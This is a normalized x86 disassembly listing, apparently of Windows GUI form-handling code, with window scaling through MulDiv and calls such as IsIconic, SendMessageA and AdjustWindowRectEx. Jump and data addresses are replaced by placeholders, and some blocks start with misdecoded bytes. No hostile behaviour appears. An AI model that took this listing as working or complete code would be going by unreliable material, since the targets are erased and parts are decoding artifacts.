mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_459cac
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_459cac
sub_45a4b8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_45a414
mov ecx edi
mov edx esi
mov eax ebx
call sub_447fd0
pop edi
pop esi
pop ebx
retn
sub_45a4e0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_45a54a
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_446ad4
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a551
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_45a551
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_45a589
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45a130
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a590
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_45a590
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45a1b0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_45a604
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4417ac
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_428b7c
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_441768
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_428b7c
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_414b8c
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_4445d4
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_45a674
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45a6d5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_40384c
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44784c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a6dc
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_45a704
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_459ef8
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_441520
mov edx 0x29
mov eax esi
call sub_441544
mov [ esi + 0x220 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_45a764
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_459f9c
xor eax eax
mov al [ ebx + 0x220 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x220 ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_45a7dc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_447ae8
pop esi
pop ebx
retn
cmp [ ebx + 0x220 ] 0x1
jne r-xdata
mov eax ebx
call sub_445ac0
sub_45a808
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45a96c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40d7e4
xor eax eax
push ebp
push sub_45a94c
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xdc ]
mov eax [ ebp - 0x4 ]
call sub_403608
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_403a24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a953
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40d8e4
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2ec ] 0x1
xor eax eax
push ebp
push sub_45a914
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_415dd0
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2ec ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_403610
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfdc
call sub_403e8c
sub_45a994
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2ec ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_4038bc
and [ ebx + 0x2ec ] 0xdf
sub_45a9cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_459ef8
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_4414d4
xor edx edx
mov eax ebx
call sub_4414f8
mov edx 0x140
mov eax ebx
call sub_441520
mov edx 0xf0
mov eax ebx
call sub_441544
mov dl 0x1
mov eax [ r-xdata ]
call sub_4280bc
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_45b2dc
mov dl 0x1
mov eax [ r-xdata ]
call sub_421e30
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_440940
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_403608
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2e4 ] eax
xor edx edx
mov eax ebx
call sub_45b640
xor edx edx
mov eax ebx
call sub_441f28
xor edx edx
mov eax ebx
call sub_441e90
mov dl 0x1
mov eax ebx
call sub_4485c4
mov edx ebx
mov eax [ rw-data ]
call sub_45fb2c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_45ab39
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
call sub_40d7e4
mov eax ebx
call sub_41e444
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_416340
xor edx edx
mov eax ebx
call sub_419808
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_45ea3c
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
sub_45aba4
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403a8c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_45ac6e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40d7e4
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45d3f8
mov eax [ ebp - 0x4 ]
call sub_448788
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd4 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45fb64
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_4036c0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_4036c0
mov eax [ ebp - 0x4 ]
add eax 0x2e8
call sub_40dabc
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_459f60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ac75
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40d8e4
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_45ac88
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2ec ] 0x2
je r-xdata
xor eax eax
push ebp
push sub_45acc9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_45b640
sub_45acce
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_4038bc
test al al
jne r-xdata
call sub_403f08
mov eax [ ebp - 0x4 ]
test [ eax + 0x2ec ] 0x2
je r-xdata
call sub_403eb4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_45b640
sub_45ad04
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_45ad45
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_45ad64
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_443e3c
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_4038bc
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_45cf3c
sub_45ada0
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_441234
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2e8 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2e8 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2e8 ]
call sub_416044
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ edi + 0x2e8 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_45c338
mov edx esi
mov eax ebp
call sub_416340
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_45c310
mov edx esi
mov eax edi
call sub_45c338
jmp r-xdata
xor edx edx
mov eax edi
call sub_45c2ec
sub_45aeac
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_444dec
xor edx edx
push ebp
push sub_45b102
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44455c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_441780
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4417c4
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_45b234
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_442f30
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b109
mov eax [ ebp - 0x4 ]
call sub_444df4
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_45a414
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_447f88
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45a414
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_447f88
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_4216f4
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_4216fc
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_45b111
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_445860
push 0x0
push 0x0
push ebx
push sub_45b218
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_45b1e4
push ebx
push sub_45b1fc
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_45b1c3
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_419ee8
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_441e90
sub_45b24f
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_45a414
mov ecx edi
mov edx esi
mov eax ebx
call sub_447f88
mov eax ebx
call sub_45b338
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_421798
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_4217b4
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4417ac
mov ebp eax
push edi
push esi
mov eax ebx
call sub_441768
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_45b5e0
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_45b610
sub_45b2dc
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_448484
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_448788
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_45d56c
push eax
push 0x1
push 0x80
mov eax ebx
call sub_448484
push eax
call SendMessageA
pop ebx
retn
sub_45b370
push ebx
mov ebx eax
mov eax ebx
call sub_45c1c0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_45b404
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_448484
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_44854c
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_448484
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_448484
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_45b48c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_448a28
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_41e7c8
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_41e79c
mov edi eax
mov eax edi
mov si 0xfff1
call sub_4038bc
test al al
jne r-xdata
sub_45b4f8
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_403608
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_45b524
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax ebp
call sub_445284
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_41e7c8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_448a70
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_41e79c
mov si 0xfff1
call sub_4038bc
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_41e7d8
jmp r-xdata
sub_45b5b8
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_441f4c
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_442f30
sub_45b5e0
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_441780
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_45b610
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_4417c4
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_45b640
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2ec ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_441c84
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2ec ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2ec ] 0x2
jmp r-xdata
mov eax esi
call sub_45c6ac
pop esi
pop ebx
retn
sub_45b684
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_45b6dd
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b6e4
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfa0
call sub_403e8c
sub_45b6ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_441c38
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_445a78
mov eax ebx
call sub_445c14
sub_45b724
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_41e614
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_45b764
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
cmp eax 0x46
jg r-xdata
sub eax 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add eax 0xfffffffa
sub eax 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_445f34
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_4038bc
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub eax 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_4038bc
jmp r-xdata
mov eax [ ebx ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec eax
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_442f30
